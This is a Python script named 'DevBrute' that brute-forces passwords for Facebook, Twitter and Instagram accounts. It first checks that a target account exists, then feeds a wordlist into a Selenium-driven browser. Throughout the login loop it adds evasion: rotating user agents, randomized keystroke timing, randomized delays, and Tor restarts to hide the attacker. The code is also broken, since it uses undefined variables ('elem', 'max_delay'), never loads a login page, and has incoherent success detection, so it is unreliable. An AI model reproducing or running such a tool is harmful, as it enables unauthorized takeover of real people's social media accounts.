import os
import random
import re
import sys
import time
import threading
import requests
import signal
import subprocess
from time import sleep
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from fake_useragent import UserAgent
from stem import Signal
from stem.control import Controller
import argparse

# Define avoidance patterns
avoidance_patterns = [
    r'^[0-9]+$',  # Avoid using all numeric passwords
    r'^[a-zA-Z]+$',  # Avoid using all alphabetic passwords
    r'^[a-zA-Z0-9]+$',  # Avoid using alphanumeric patterns
    # Add more patterns as needed
]

# Set up a user agent generator
ua_generator = UserAgent()

class Bruter:
    def __init__(self, service, username, wordlist, delay, fb_name=None):
        self.service = service
        self.username = username
        self.wordlist = wordlist
        self.delay = delay
        self.fb_name = fb_name

    def stop_tor(self):
        # Stopping Tor
        os.system("service tor stop")
        exit(1)

    def execute(self):
        if self.user_check(self.username) == 1:
            print("[Error] Username does not exist")
            exit(1)

        print("[OK] Checking account existence\n")
        self.web_bruteforce(self.username, self.wordlist, self.service, self.delay)

    def user_check(self, username):
        try:
            if self.service == "facebook":
                response = requests.get("https://www.facebook.com/public/" + self.fb_name)
                if "We couldn't find anything for" in response.text:
                    return 1
            elif self.service == "twitter":
                response = requests.get("https://www.twitter.com/" + username)
                if "Sorry, that page doesn’t exist!" in response.text:
                    return 1
            elif self.service == "instagram":
                response = requests.get("https://instagram.com/" + username)
                if "Sorry, this page isn't available." in response.text:
                    return 1

            return 0
        except Exception as e:
            print("[Error] Exception occurred during user check:", e)
            return 1

    def web_bruteforce(self, username, wordlist, service, delay):
        print("\n- Bruteforce starting ( Delay = %s sec ) -\n" % self.delay)
        driver = webdriver.Firefox()
        wordlist_file = open(wordlist, 'r')

        unsuccessful_attempts = 0

        for password in wordlist_file.readlines():
            password = password.strip("\n")
            try:
                # Check if the password matches any avoidance pattern
                if any(re.match(pattern, password) for pattern in avoidance_patterns):
                    continue  # Skip this password

                # If login attempt was unsuccessful, increment the count
                unsuccessful_attempts += 1

                # Calculate the delay based on the number of unsuccessful attempts
                progressive_delay = min(delay * (2 ** unsuccessful_attempts), max_delay)

                # Add a randomized delay (with a maximum value)
                randomized_delay = random.uniform(0, progressive_delay)

                # Rotate User-Agent
                user_agent = ua_generator.random
                headers = {"User-Agent": user_agent}
                driver.execute_cdp_cmd('Network.setUserAgentOverride', {"userAgent": user_agent})

                # Randomize keystroke timing
                for char in password:
                    elem.send_keys(char)
                    time.sleep(random.uniform(0.1, 0.5))  # Random delay between keystrokes

                elem.send_keys(Keys.RETURN)

            except AssertionError:
                print("  Username: {} \t| Password found: {}\n".format(username, password))
                driver.quit()
                self.stop_tor()

            except Exception as e:
                print("\nError : {}".format(e))
                driver.quit()
                self.stop_tor()


# DevBrute Banner
print("""\033[1;37m
 _____             ____             _       
|  __ \           |  _ \           | |      
| |  | | _____   _| |_) |_ __ _   _| |_ ___ 
| |  | |/ _ \ \ / /  _ <| '__| | | | __/ _ \\
| |__| |  __/\ V /| |_) | |  | |_| | ||  __/
|_____/ \___| \_/ |____/|_|   \__,_|\__\___|""")

def main():
    parser = argparse.ArgumentParser(description='BruteForce Framework written by Devprogramming')
    required = parser.add_argument_group('required arguments')
    required.add_argument('-s', '--service', dest='service', required=True)
    required.add_argument('-u', '--username', dest='username', required=True)
    required.add_argument('-w', '--wordlist', dest='password', required=True)
    parser.add_argument('-d', '--delay', type=int, dest='delay')

    args = parser.parse_args()

    service = args.service
    username = args.username
    wordlist = args.password
    delay = args.delay or 1

    if not os.path.exists(wordlist):
        print("[Error] Wordlist not found")
        exit(1)

    if service == "facebook":
        fb_name = input("Please Enter the Name of the Facebook Account: ")
        os.system("clear")
        os.system("service tor restart")

    br = Bruter(service, username, wordlist, delay, fb_name=fb_name)
    br.execute()


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\nError : Keyboard Interrupt")
        os.system("service tor stop")
        exit(1)
